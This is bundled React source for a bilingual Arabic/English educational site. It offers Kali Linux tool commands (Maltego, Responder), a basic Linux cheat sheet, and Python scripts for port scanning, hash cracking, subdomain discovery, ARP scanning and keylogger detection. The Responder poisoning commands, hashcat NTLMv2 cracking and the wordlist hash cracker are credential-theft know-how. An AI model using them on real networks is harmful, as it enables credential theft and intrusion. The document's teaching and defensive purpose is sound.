                { command: "File → Export → As Report", description: { ar: "تصدير كتقرير", en: "Export as report" } },
                { command: "Transform Hub → Install", description: { ar: "تثبيت تحويلات", en: "Install transforms" } },
                { command: "Settings → API Keys", description: { ar: "إعداد مفاتيح API", en: "Set API keys" } },
                {
                    command: "Entity → Social Network → To Profile",
                    description: { ar: "ملفات التواصل", en: "Social profiles" },
                },
                {
                    command: "Entity → Hash → To Malware",
                    description: { ar: "تحليل البرمجيات الخبيثة", en: "Malware analysis" },
                },
                { command: "Entity → Location → To GPS", description: { ar: "إحداثيات GPS", en: "GPS coordinates" } },
                { command: "File → New Machine", description: { ar: "آلة جديدة", en: "New machine" } },
            ],
        },
        {
            name: "Responder",
            description: { ar: "أداة التقاط كلمات المرور في الشبكة", en: "Network password capture tool" },
            commands: [
                {
                    command: "responder -I eth0",
                    description: { ar: "الاستماع على الواجهة", en: "Listen on interface" },
                },
                { command: "responder -I eth0 -wrf", description: { ar: "وضع متقدم", en: "Advanced mode" } },
                { command: "responder -I eth0 --lm", description: { ar: "التقاط LM", en: "Capture LM" } },
                { command: "responder -I eth0 -b", description: { ar: "تعطيل NBNS", en: "Disable NBNS" } },
                { command: "responder -I eth0 -r", description: { ar: "تحليل NetBIOS", en: "NetBIOS analysis" } },
                { command: "responder -I eth0 -d", description: { ar: "تحليل DHCP", en: "DHCP analysis" } },
                { command: "responder -I eth0 -w", description: { ar: "خادم WPAD", en: "WPAD server" } },
                { command: "responder -I eth0 -F", description: { ar: "فرض WPAD", en: "Force WPAD" } },
                { command: "responder -I eth0 -P", description: { ar: "بروكسي WPAD", en: "WPAD proxy" } },
                { command: "responder -I eth0 -v", description: { ar: "وضع مفصل", en: "Verbose mode" } },
                { command: "responder -I eth0 --disable-ess", description: { ar: "تعطيل ESS", en: "Disable ESS" } },
                { command: "responder -I eth0 -e IP", description: { ar: "IP خارجي", en: "External IP" } },
                { command: "cat /usr/share/responder/logs/*", description: { ar: "عرض السجلات", en: "View logs" } },
                { command: "responder --version", description: { ar: "عرض الإصدار", en: "Show version" } },
                { command: "responder -I eth0 -A", description: { ar: "وضع التحليل فقط", en: "Analyze only mode" } },
                {
                    command: "hashcat -m 5600 hash.txt wordlist.txt",
                    description: { ar: "كسر NTLMv2", en: "Crack NTLMv2" },
                },
                { command: "responder -I eth0 --basic", description: { ar: "مصادقة أساسية", en: "Basic auth" } },
                { command: "responder -I eth0 --wredir", description: { ar: "إعادة توجيه WPAD", en: "WPAD redirect" } },
                { command: "responder -I eth0 --lldp", description: { ar: "LLDP Spoofing", en: "LLDP Spoofing" } },
                { command: "responder -I eth0 -i IP", description: { ar: "IP محدد", en: "Specific IP" } },
            ],
        },
    ],
    Zb = () => {
        const [e, t] = x.useState(0),
            [n, r] = x.useState(null),
            [o, s] = x.useState(""),
            [i, a] = x.useState("ar"),
            l = (m) => {
                navigator.clipboard.writeText(m), r(m), setTimeout(() => r(null), 2e3);
            },
            u = x.useMemo(() => {
                if (!o.trim()) return Io;
                const m = o.toLowerCase();
                return Io.filter(
                    (f) =>
                        f.name.toLowerCase().includes(m) ||
                        f.description.ar.includes(o) ||
                        f.description.en.toLowerCase().includes(m) ||
                        f.commands.some(
                            (S) =>
                                S.command.toLowerCase().includes(m) ||
                                S.description.ar.includes(o) ||
                                S.description.en.toLowerCase().includes(m)
                        )
                );
            }, [o]),
            d = Io.reduce((m, f) => m + f.commands.length, 0),
            p = {
                title: i === "ar" ? "أدوات كالي لينكس" : "Kali Linux Tools",
                subtitle:
                    i === "ar"
                        ? `${Io.length} أداة  مع ${d} أمر`
                        : `${Io.length} professional tools with ${d} commands`,
                search: i === "ar" ? "ابحث عن أداة أو أمر..." : "Search for a tool or command...",
                commands: i === "ar" ? "أمر" : "commands",
            };
        return c.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                c.jsx(wr, {}),
                c.jsx("main", {
                    className: "pt-24 pb-16",
                    children: c.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            c.jsxs("div", {
                                className: "text-center mb-12",
                                children: [
                                    c.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: c.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: c.jsx(fr, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    c.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mb-4",
                                        children: [
                                            c.jsx("h1", {
                                                className: "text-4xl md:text-5xl font-bold text-primary text-glow",
                                                children: p.title,
                                            }),
                                            c.jsx("button", {
                                                onClick: () => a((m) => (m === "ar" ? "en" : "ar")),
                                                className:
                                                    "p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors",
                                                children: c.jsx(Rs, { className: "w-5 h-5 text-muted-foreground" }),
                                            }),
                                        ],
                                    }),
                                    c.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: p.subtitle,
                                    }),
                                ],
                            }),
                            c.jsx("div", {
                                className: "max-w-2xl mx-auto mb-10",
                                children: c.jsxs("div", {
                                    className: "relative",
                                    children: [
                                        c.jsx(Gr, {
                                            className:
                                                "absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground",
                                        }),
                                        c.jsx("input", {
                                            type: "text",
                                            value: o,
                                            onChange: (m) => s(m.target.value),
                                            placeholder: p.search,
                                            className:
                                                "w-full px-4 py-3 pr-12 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all",
                                            dir: i === "ar" ? "rtl" : "ltr",
                                        }),
                                    ],
                                }),
                            }),
                            c.jsx("div", {
                                className: "max-w-6xl mx-auto space-y-4",
                                children: u.map((m, f) =>
                                    c.jsxs(
                                        "div",
                                        {
                                            className: "cyber-card overflow-hidden",
                                            children: [
                                                c.jsxs("button", {
                                                    onClick: () => t(e === f ? null : f),
                                                    className:
                                                        "w-full p-5 flex items-center justify-between hover:bg-primary/5 transition-colors",
                                                    children: [
                                                        c.jsxs("div", {
                                                            className: "flex items-center gap-4",
                                                            children: [
                                                                c.jsx("div", {
                                                                    className:
                                                                        "w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center",
                                                                    children: (() => {
                                                                        const S = Yb[m.name] || fr;
                                                                        return c.jsx(S, {
                                                                            className: "w-6 h-6 text-primary",
                                                                        });
                                                                    })(),
                                                                }),
                                                                c.jsxs("div", {
                                                                    className: i === "ar" ? "text-right" : "text-left",
                                                                    children: [
                                                                        c.jsx("h3", {
                                                                            className: "text-xl font-bold text-primary",
                                                                            children: m.name,
                                                                        }),
                                                                        c.jsx("p", {
                                                                            className: "text-muted-foreground text-sm",
                                                                            children:
                                                                                i === "ar"
                                                                                    ? m.description.ar
                                                                                    : m.description.en,
                                                                        }),
                                                                    ],
                                                                }),
                                                            ],
                                                        }),
                                                        c.jsxs("div", {
                                                            className: "flex items-center gap-3",
                                                            children: [
                                                                c.jsxs("span", {
                                                                    className: "text-muted-foreground text-sm",
                                                                    children: [m.commands.length, " ", p.commands],
                                                                }),
                                                                e === f
                                                                    ? c.jsx(Ki, { className: "w-6 h-6 text-primary" })
                                                                    : c.jsx(Wi, {
                                                                          className: "w-6 h-6 text-muted-foreground",
                                                                      }),
                                                            ],
                                                        }),
                                                    ],
                                                }),
                                                e === f &&
                                                    c.jsx("div", {
                                                        className:
                                                            "border-t border-border/30 p-4 grid grid-cols-1 md:grid-cols-2 gap-3 animate-fade-in",
                                                        children: m.commands.map((S, v) =>
                                                            c.jsxs(
                                                                "div",
                                                                {
                                                                    className:
                                                                        "flex items-start gap-3 p-3 rounded-xl bg-secondary/50 hover:bg-secondary/80 transition-colors group",
                                                                    children: [
                                                                        c.jsx("span", {
                                                                            className:
                                                                                "w-7 h-7 rounded-lg bg-primary/20 text-primary flex items-center justify-center font-bold text-xs flex-shrink-0",
                                                                            children: v + 1,
                                                                        }),
                                                                        c.jsxs("div", {
                                                                            className: "flex-1 min-w-0",
                                                                            children: [
                                                                                c.jsxs("div", {
                                                                                    className:
                                                                                        "flex items-center gap-2 mb-1",
                                                                                    children: [
                                                                                        c.jsx("code", {
                                                                                            className:
                                                                                                "text-primary text-xs font-mono bg-background/50 px-2 py-0.5 rounded break-all",
                                                                                            dir: "ltr",
                                                                                            children: S.command,
                                                                                        }),
                                                                                        c.jsx("button", {
                                                                                            onClick: () => l(S.command),
                                                                                            className:
                                                                                                "p-1 rounded hover:bg-primary/20 transition-colors opacity-0 group-hover:opacity-100 flex-shrink-0",
                                                                                            children:
                                                                                                n === S.command
                                                                                                    ? c.jsx(Au, {
                                                                                                          className:
                                                                                                              "w-3 h-3 text-primary",
                                                                                                      })
                                                                                                    : c.jsx(Sa, {
                                                                                                          className:
                                                                                                              "w-3 h-3 text-muted-foreground",
                                                                                                      }),
                                                                                        }),
                                                                                    ],
                                                                                }),
                                                                                c.jsx("p", {
                                                                                    className:
                                                                                        "text-muted-foreground text-xs",
                                                                                    children:
                                                                                        i === "ar"
                                                                                            ? S.description.ar
                                                                                            : S.description.en,
                                                                                }),
                                                                            ],
                                                                        }),
                                                                    ],
                                                                },
                                                                v
                                                            )
                                                        ),
                                                    }),
                                            ],
                                        },
                                        f
                                    )
                                ),
                            }),
                        ],
                    }),
                }),
                c.jsx(Sr, {}),
            ],
        });
    },
    Jb = [
        {
            command: "cd /path/to/directory",
            description: { ar: "تغيير المجلد الحالي", en: "Change current directory" },
            icon: c.jsx(dl, { className: "w-4 h-4" }),
            category: "navigation",
        },
        {
            command: "cd ..",
            description: { ar: "الرجوع للمجلد السابق", en: "Go to parent directory" },
            icon: c.jsx(yp, { className: "w-4 h-4 rotate-180" }),
            category: "navigation",
        },
        {
            command: "cd ~",
            description: { ar: "الذهاب للمجلد الرئيسي", en: "Go to home directory" },
            icon: c.jsx(nx, { className: "w-4 h-4" }),
            category: "navigation",
        },
        {
            command: "pwd",
            description: { ar: "عرض المسار الحالي", en: "Print working directory" },
            icon: c.jsx(dl, { className: "w-4 h-4" }),
            category: "navigation",
        },
        {
            command: "ls",
            description: { ar: "عرض محتويات المجلد", en: "List directory contents" },
            icon: c.jsx(wp, { className: "w-4 h-4" }),
            category: "listing",
        },
        {
            command: "ls -la",
            description: { ar: "عرض كل الملفات مع التفاصيل", en: "List all files with details" },
            icon: c.jsx(Gi, { className: "w-4 h-4" }),
            category: "listing",
        },
        {
            command: "ls -lh",
            description: { ar: "عرض الملفات بأحجام مقروءة", en: "List with human-readable sizes" },
            icon: c.jsx(Tr, { className: "w-4 h-4" }),
            category: "listing",
        },
        {
            command: "tree",
            description: { ar: "عرض هيكل المجلدات", en: "Display directory tree" },
            icon: c.jsx(sx, { className: "w-4 h-4" }),
            category: "listing",
        },
        {
            command: "cat filename",
            description: { ar: "عرض محتوى ملف", en: "Display file content" },
            icon: c.jsx(Tr, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "head -n 10 filename",
            description: { ar: "عرض أول 10 أسطر", en: "Show first 10 lines" },
            icon: c.jsx(Tr, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "tail -n 10 filename",
            description: { ar: "عرض آخر 10 أسطر", en: "Show last 10 lines" },
            icon: c.jsx(Tr, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "less filename",
            description: { ar: "قراءة ملف مع التمرير", en: "View file with scrolling" },
            icon: c.jsx(Gi, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "nano filename",
            description: { ar: "تحرير ملف بمحرر nano", en: "Edit file with nano" },
            icon: c.jsx(bp, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "vim filename",
            description: { ar: "تحرير ملف بمحرر vim", en: "Edit file with vim" },
            icon: c.jsx(bp, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "touch filename",
            description: { ar: "إنشاء ملف جديد", en: "Create new file" },
            icon: c.jsx(Tr, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "cp source dest",
            description: { ar: "نسخ ملف أو مجلد", en: "Copy file or directory" },
            icon: c.jsx(Sa, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "mv source dest",
            description: { ar: "نقل أو إعادة تسمية", en: "Move or rename" },
            icon: c.jsx(yp, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "rm filename",
            description: { ar: "حذف ملف", en: "Remove file" },
            icon: c.jsx(pl, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "rm -rf directory",
            description: { ar: "حذف مجلد بمحتوياته", en: "Remove directory recursively" },
            icon: c.jsx(pl, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "mkdir dirname",
            description: { ar: "إنشاء مجلد جديد", en: "Create new directory" },
            icon: c.jsx(dl, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "sudo su",
            description: { ar: "الدخول كمستخدم root", en: "Switch to root user" },
            icon: c.jsx(fo, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "sudo command",
            description: { ar: "تنفيذ أمر كـ root", en: "Execute as root" },
            icon: c.jsx(yc, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "whoami",
            description: { ar: "عرض اسم المستخدم الحالي", en: "Display current username" },
            icon: c.jsx(wc, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "chmod 755 file",
            description: { ar: "تغيير صلاحيات الملف", en: "Change file permissions" },
            icon: c.jsx(fo, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "chown user:group file",
            description: { ar: "تغيير مالك الملف", en: "Change file owner" },
            icon: c.jsx(wc, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "passwd",
            description: { ar: "تغيير كلمة المرور", en: "Change password" },
            icon: c.jsx(yc, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "uname -a",
            description: { ar: "معلومات النظام الكاملة", en: "Full system information" },
            icon: c.jsx(Yo, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "df -h",
            description: { ar: "مساحة الأقراص", en: "Disk space usage" },
            icon: c.jsx(sg, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "free -h",
            description: { ar: "استخدام الذاكرة", en: "Memory usage" },
            icon: c.jsx(vp, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "top",
            description: { ar: "مراقبة العمليات", en: "Monitor processes" },
            icon: c.jsx(Yo, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "htop",
            description: { ar: "مراقبة متقدمة للعمليات", en: "Advanced process monitor" },
            icon: c.jsx(vp, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "ps aux",
            description: { ar: "عرض كل العمليات", en: "List all processes" },
            icon: c.jsx(wp, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "kill PID",
            description: { ar: "إنهاء عملية بالـ ID", en: "Kill process by ID" },
            icon: c.jsx(ti, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "killall name",
            description: { ar: "إنهاء عملية بالاسم", en: "Kill process by name" },
            icon: c.jsx(ti, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "history",
            description: { ar: "عرض سجل الأوامر", en: "Show command history" },
            icon: c.jsx(cl, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "history | grep keyword",
            description: { ar: "البحث في السجل", en: "Search in history" },
            icon: c.jsx(Gr, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "find /path -name filename",
            description: { ar: "البحث عن ملف", en: "Find a file" },
            icon: c.jsx(Gr, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "grep pattern file",
            description: { ar: "البحث داخل ملف", en: "Search in file" },
            icon: c.jsx(Gr, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "locate filename",
            description: { ar: "بحث سريع عن ملف", en: "Quick file search" },
            icon: c.jsx(ag, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "ifconfig",
            description: { ar: "عرض إعدادات الشبكة", en: "Network configuration" },
            icon: c.jsx($r, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "ip addr",
            description: { ar: "عرض عناوين IP", en: "Show IP addresses" },
            icon: c.jsx($r, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "ping host",
            description: { ar: "اختبار الاتصال", en: "Test connectivity" },
            icon: c.jsx($r, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "netstat -tuln",
            description: { ar: "عرض المنافذ المفتوحة", en: "Show open ports" },
            icon: c.jsx($r, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "wget URL",
            description: { ar: "تحميل ملف من الإنترنت", en: "Download file from URL" },
            icon: c.jsx(Qi, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "curl URL",
            description: { ar: "جلب محتوى من رابط", en: "Fetch content from URL" },
            icon: c.jsx(Qi, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "apt update",
            description: { ar: "تحديث قائمة الحزم", en: "Update package list" },
            icon: c.jsx(Sp, { className: "w-4 h-4" }),
            category: "packages",
        },
        {
            command: "apt upgrade",
            description: { ar: "ترقية الحزم المثبتة", en: "Upgrade installed packages" },
            icon: c.jsx(mx, { className: "w-4 h-4" }),
            category: "packages",
        },
        {
            command: "apt install package",
            description: { ar: "تثبيت حزمة جديدة", en: "Install new package" },
            icon: c.jsx(Xv, { className: "w-4 h-4" }),
            category: "packages",
        },
        {
            command: "apt remove package",
            description: { ar: "إزالة حزمة", en: "Remove package" },
            icon: c.jsx(pl, { className: "w-4 h-4" }),
            category: "packages",
        },
        {
            command: "tar -cvf archive.tar files",
            description: { ar: "إنشاء أرشيف tar", en: "Create tar archive" },
            icon: c.jsx(ei, { className: "w-4 h-4" }),
            category: "compression",
        },
        {
            command: "tar -xvf archive.tar",
            description: { ar: "فك أرشيف tar", en: "Extract tar archive" },
            icon: c.jsx(ei, { className: "w-4 h-4" }),
            category: "compression",
        },
        {
            command: "gzip filename",
            description: { ar: "ضغط ملف بـ gzip", en: "Compress with gzip" },
            icon: c.jsx(ei, { className: "w-4 h-4" }),
            category: "compression",
        },
        {
            command: "unzip archive.zip",
            description: { ar: "فك ملف مضغوط", en: "Extract zip file" },
            icon: c.jsx(ei, { className: "w-4 h-4" }),
            category: "compression",
        },
        {
            command: "clear",
            description: { ar: "مسح الشاشة", en: "Clear terminal screen" },
            icon: c.jsx(Yo, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "exit",
            description: { ar: "الخروج من الطرفية", en: "Exit terminal" },
            icon: c.jsx(ti, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "reboot",
            description: { ar: "إعادة تشغيل النظام", en: "Reboot system" },
            icon: c.jsx(Sp, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "shutdown now",
            description: { ar: "إيقاف النظام", en: "Shutdown system" },
            icon: c.jsx(ti, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "man command",
            description: { ar: "عرض دليل الأمر", en: "Show command manual" },
            icon: c.jsx(Tr, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "echo text",
            description: { ar: "طباعة نص", en: "Print text" },
            icon: c.jsx(Zv, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "date",
            description: { ar: "عرض التاريخ والوقت", en: "Show date and time" },
            icon: c.jsx(cl, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "cal",
            description: { ar: "عرض التقويم", en: "Show calendar" },
            icon: c.jsx(cl, { className: "w-4 h-4" }),
            category: "other",
        },
    ],
    ek = [
        { id: "all", label: { ar: "الكل", en: "All" } },
        { id: "navigation", label: { ar: "التنقل", en: "Navigation" } },
        { id: "listing", label: { ar: "العرض", en: "Listing" } },
        { id: "files", label: { ar: "الملفات", en: "Files" } },
        { id: "permissions", label: { ar: "الصلاحيات", en: "Permissions" } },
        { id: "system", label: { ar: "النظام", en: "System" } },
        { id: "history", label: { ar: "البحث", en: "Search" } },
        { id: "network", label: { ar: "الشبكة", en: "Network" } },
        { id: "packages", label: { ar: "الحزم", en: "Packages" } },
        { id: "compression", label: { ar: "الضغط", en: "Compression" } },
        { id: "other", label: { ar: "أخرى", en: "Other" } },
    ],
    tk = () => {
        const [e, t] = x.useState(null),
            [n, r] = x.useState("ar"),
            [o, s] = x.useState("all"),
            [i, a] = x.useState(""),
            l = (p) => {
                navigator.clipboard.writeText(p), t(p), setTimeout(() => t(null), 2e3);
            },
            u = Jb.filter((p) => {
                const m = o === "all" || p.category === o,
                    f =
                        i === "" ||
                        p.command.toLowerCase().includes(i.toLowerCase()) ||
                        p.description[n].toLowerCase().includes(i.toLowerCase());
                return m && f;
            }),
            d = {
                title: n === "ar" ? "أوامر كالي لينكس" : "Kali Linux Commands",
                subtitle: n === "ar" ? "أهم الأوامر الأساسية لنظام كالي لينكس" : "Essential commands for Kali Linux",
                searchPlaceholder: n === "ar" ? "ابحث عن أمر..." : "Search for a command...",
                commandsCount: n === "ar" ? `${u.length} أمر` : `${u.length} commands`,
            };
        return c.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                c.jsx(wr, {}),
                c.jsx("main", {
                    className: "pt-24 pb-16",
                    children: c.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            c.jsxs("div", {
                                className: "text-center mb-12",
                                children: [
                                    c.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: c.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: c.jsx(fr, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    c.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mb-4",
                                        children: [
                                            c.jsx("h1", {
                                                className: "text-4xl md:text-5xl font-bold text-primary text-glow",
                                                children: d.title,
                                            }),
                                            c.jsx("button", {
                                                onClick: () => r((p) => (p === "ar" ? "en" : "ar")),
                                                className:
                                                    "p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors",
                                                children: c.jsx(Rs, { className: "w-5 h-5 text-muted-foreground" }),
                                            }),
                                        ],
                                    }),
                                    c.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: d.subtitle,
                                    }),
                                ],
                            }),
                            c.jsx("div", {
                                className: "max-w-2xl mx-auto mb-8",
                                children: c.jsxs("div", {
                                    className: "relative",
                                    children: [
                                        c.jsx(Gr, {
                                            className:
                                                "absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground",
                                        }),
                                        c.jsx("input", {
                                            type: "text",
                                            value: i,
                                            onChange: (p) => a(p.target.value),
                                            placeholder: d.searchPlaceholder,
                                            className:
                                                "w-full pl-12 pr-4 py-3 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all",
                                            dir: n === "ar" ? "rtl" : "ltr",
                                        }),
                                    ],
                                }),
                            }),
                            c.jsx("div", {
                                className: "flex flex-wrap justify-center gap-2 mb-8",
                                children: ek.map((p) =>
                                    c.jsx(
                                        "button",
                                        {
                                            onClick: () => s(p.id),
                                            className: `px-4 py-2 rounded-xl text-sm font-medium transition-all ${o === p.id ? "bg-primary text-primary-foreground" : "bg-secondary border border-border/50 text-muted-foreground hover:border-primary/50"}`,
                                            children: n === "ar" ? p.label.ar : p.label.en,
                                        },
                                        p.id
                                    )
                                ),
                            }),
                            c.jsx("div", {
                                className: "text-center mb-6",
                                children: c.jsx("span", {
                                    className: "text-muted-foreground text-sm",
                                    children: d.commandsCount,
                                }),
                            }),
                            c.jsx("div", {
                                className: "max-w-5xl mx-auto",
                                children: c.jsx("div", {
                                    className: "grid grid-cols-1 md:grid-cols-2 gap-4",
                                    children: u.map((p, m) =>
                                        c.jsx(
                                            "div",
                                            {
                                                className:
                                                    "cyber-card p-4 hover:border-primary/50 transition-all group",
                                                children: c.jsxs("div", {
                                                    className: "flex items-start gap-3",
                                                    children: [
                                                        c.jsx("span", {
                                                            className:
                                                                "w-10 h-10 rounded-lg bg-primary/20 text-primary flex items-center justify-center flex-shrink-0",
                                                            children: p.icon,
                                                        }),
                                                        c.jsxs("div", {
                                                            className: "flex-1 min-w-0",
                                                            children: [
                                                                c.jsxs("div", {
                                                                    className: "flex items-center gap-2 mb-2",
                                                                    children: [
                                                                        c.jsx("code", {
                                                                            className:
                                                                                "text-primary text-sm font-mono bg-background/50 px-2 py-1 rounded break-all flex-1",
                                                                            dir: "ltr",
                                                                            children: p.command,
                                                                        }),
                                                                        c.jsx("button", {
                                                                            onClick: () => l(p.command),
                                                                            className:
                                                                                "p-1.5 rounded-lg hover:bg-primary/20 transition-colors opacity-0 group-hover:opacity-100 flex-shrink-0",
                                                                            children:
                                                                                e === p.command
                                                                                    ? c.jsx(Au, {
                                                                                          className:
                                                                                              "w-4 h-4 text-primary",
                                                                                      })
                                                                                    : c.jsx(Sa, {
                                                                                          className:
                                                                                              "w-4 h-4 text-muted-foreground",
                                                                                      }),
                                                                        }),
                                                                    ],
                                                                }),
                                                                c.jsx("p", {
                                                                    className: "text-muted-foreground text-sm",
                                                                    children:
                                                                        n === "ar"
                                                                            ? p.description.ar
                                                                            : p.description.en,
                                                                }),
                                                            ],
                                                        }),
                                                    ],
                                                }),
                                            },
                                            m
                                        )
                                    ),
                                }),
                            }),
                        ],
                    }),
                }),
                c.jsx(Sr, {}),
            ],
        });
    },
    si = [
        {
            name: { ar: "ماسح المنافذ", en: "Port Scanner" },
            description: { ar: "ماسح منافذ بسيط وسريع", en: "Simple and fast port scanner" },
            language: "Python",
            code: `import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is OPEN")
        sock.close()
    except:
        pass

def main():
    target = input("Enter target IP: ")
    print(f"\\nScanning {target}...\\n")
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(1, 1025):
            executor.submit(scan_port, target, port)

if __name__ == "__main__":
    main()`,
        },
        {
            name: { ar: "كاسر الهاش", en: "Hash Cracker" },
            description: { ar: "أداة لكسر الهاش باستخدام قائمة كلمات", en: "Hash cracking tool with wordlist" },
            language: "Python",
            code: `import hashlib

def crack_hash(target_hash, wordlist, hash_type="md5"):
    hash_funcs = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256
    }
    
    if hash_type not in hash_funcs:
        print("Unsupported hash type")
        return None
    
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for word in f:
            word = word.strip()
            hashed = hash_funcs[hash_type](word.encode()).hexdigest()
            if hashed == target_hash:
                print(f"[+] Found: {word}")
                return word
    
    print("[-] Password not found")
    return None

# Usage
# crack_hash("5d41402abc4b2a76b9719d911017c592", "rockyou.txt", "md5")`,
        },
        {
            name: { ar: "مكتشف النطاقات الفرعية", en: "Subdomain Finder" },
            description: { ar: "اكتشاف النطاقات الفرعية", en: "Discover subdomains" },
            language: "Python",
            code: `import requests
import concurrent.futures

subdomains = [
    "www", "mail", "ftp", "admin", "blog", "shop", "api",
    "dev", "test", "staging", "app", "mobile", "cdn", "vpn",
    "portal", "secure", "login", "dashboard", "panel", "cpanel"
]

def check_subdomain(subdomain, domain):
    url = f"http://{subdomain}.{domain}"
    try:
        response = requests.get(url, timeout=3)
        print(f"[+] Found: {url} ({response.status_code})")
        return url
    except:
        return None

def find_subdomains(domain):
    print(f"\\nScanning subdomains for {domain}...\\n")
    found = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_subdomain, sub, domain): sub for sub in subdomains}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
    
    print(f"\\n[*] Found {len(found)} subdomains")
    return found

# Usage: find_subdomains("example.com")`,
        },
        {
            name: { ar: "ماسح الشبكة", en: "Network Scanner" },
            description: { ar: "مسح الأجهزة في الشبكة المحلية", en: "Scan local network devices" },
            language: "Python",
            code: `from scapy.all import ARP, Ether, srp
import sys

def scan_network(ip_range):
    print(f"\\nScanning network: {ip_range}\\n")
    print("-" * 50)
    print(f"{'IP Address':<20} {'MAC Address':<20}")
    print("-" * 50)
    
    # Create ARP request
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send and receive
    result = srp(packet, timeout=3, verbose=0)[0]
    
    devices = []
    for sent, received in result:
        devices.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })
        print(f"{received.psrc:<20} {received.hwsrc:<20}")
    
    print("-" * 50)
    print(f"\\n[*] Found {len(devices)} devices")
    return devices

# Usage: scan_network("192.168.1.0/24")`,
        },
        {
            name: { ar: "كاشف Keylogger", en: "Keylogger Detector" },
            description: { ar: "كشف برامج التجسس على لوحة المفاتيح", en: "Detect keyboard spyware" },
            language: "Python",
            code: `import psutil
import os

suspicious_names = [
    "keylogger", "logger", "hook", "capture", "spy",
    "monitor", "record", "keystroke", "input"
]

def detect_keyloggers():
    print("\\n[*] Scanning for suspicious processes...\\n")
    
    suspicious = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            name = proc.info['name'].lower()
            for keyword in suspicious_names:
                if keyword in name:
                    suspicious.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'path': proc.info['exe']
                    })
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    
    if suspicious:
        print("[!] Suspicious processes found:")
        for proc in suspicious:
            print(f"  PID: {proc['pid']}, Name: {proc['name']}")
            print(f"  Path: {proc['path']}\\n")
    else:
